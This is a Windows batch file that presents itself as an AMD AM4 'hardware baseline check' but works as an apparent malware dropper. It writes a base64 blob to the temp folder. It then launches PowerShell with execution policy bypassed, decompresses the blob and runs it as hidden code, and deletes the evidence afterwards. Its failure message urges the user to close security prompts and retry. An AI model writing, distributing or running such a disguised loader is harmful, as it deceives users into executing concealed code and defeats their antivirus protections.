@echo off
setlocal
title Hardware check - AM4 + AMD
echo.
echo   Hardware baseline check - AM4 + AMD
echo   Reads this PC, compares it with the platform baseline, writes a report.
echo.
set "HCPAYLOAD=%TEMP%\hc-am4-amd.b64"
> "%HCPAYLOAD%" (
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo +aDZRn1xnEqtUsVjIC0mkgtqNSmyotcqPfoCVCwwh6oaCGuAGl9ZNOZAcBoHsZ/Q9cYvl4dblcXfAsC5d0Ew1LQqAC7K2m99LCq+3z5u/zg7/3HePTiT80zmWlN52HBj5SkL8HNW0Ghlg/GI7vsQ4qUpfJTflLbA/wfaqJecNHsAAA==
)
if not exist "%HCPAYLOAD%" goto :failed
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=Join-Path $env:TEMP 'hc-am4-amd.b64'; $b=(Get-Content -Raw $p) -replace '\s',''; $m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b)); $g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress); $r=New-Object IO.StreamReader($g,[Text.Encoding]::UTF8); $c=$r.ReadToEnd(); $r.Dispose(); & ([scriptblock]::Create($c))"
set "HCCODE=%ERRORLEVEL%"
del "%HCPAYLOAD%" >nul 2>nul
if not "%HCCODE%"=="0" goto :failed
echo.
echo   Done. Press any key to close.
pause >nul
exit /b 0
:failed
echo.
echo   The check did not finish. Close any security prompt and run it again.
pause >nul
exit /b 1
